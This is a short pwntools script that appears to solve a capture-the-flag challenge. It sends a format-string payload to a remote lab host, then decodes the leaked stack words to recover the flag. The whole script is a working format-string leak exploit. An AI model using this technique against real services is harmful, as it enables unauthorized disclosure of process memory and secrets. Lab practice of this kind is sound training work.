from pwn import *

context.binary = binary = "./pwn106user.pwn106-user"

payload = "%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX"

#p = process()

p = remote("10.10.179.131", 9006)
p.recv()
p.recv()
p.sendline(payload)
output = p.recv().strip().split(b" ")[1].split(b".")

flag=""

print(output)

for word in output:
	print(bytes.fromhex(word.decode("utf-8"))[::-1])

print("Flag: {}".format(flag))
